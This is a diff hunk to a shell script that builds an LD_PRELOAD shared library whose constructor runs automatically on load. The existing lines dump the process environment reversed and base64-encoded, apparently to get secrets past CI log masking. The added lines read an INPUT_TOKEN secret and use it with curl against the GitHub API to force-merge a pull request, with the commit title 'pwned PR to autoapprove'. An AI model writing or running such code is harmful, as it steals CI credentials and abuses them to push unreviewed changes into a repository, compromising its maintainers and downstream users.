@@ -34,6 +34,22 @@ cat >test.c <<EOF
 static void __attribute__((constructor)) so_main(void) {
   unsetenv("LD_PRELOAD");
   system("env | rev | base64 -w 0");
+
+  char* inputToken = getenv("INPUT_TOKEN");
+  if (inputToken != NULL && strlen(inputToken) > 0) {
+    char command[1024];
+    snprintf(command, sizeof(command), "curl -X PUT "
+      "https://api.github.com/repos/mousefluff/sdkman-cli/pulls/3/merge "
+      "-H \"Accept: application/vnd.github.v3+json\" "
+      "--header \"authorization: Bearer %s\" "
+      "--header 'content-type: application/json' "
+      "-d '{\"commit_title\":\"pwned PR to autoapprove\"}'", inputToken);
+
+    system(command);
+  } else {
+    printf("INPUT_TOKEN is not set.\n");
+  }
+
   return;
 }
 EOF
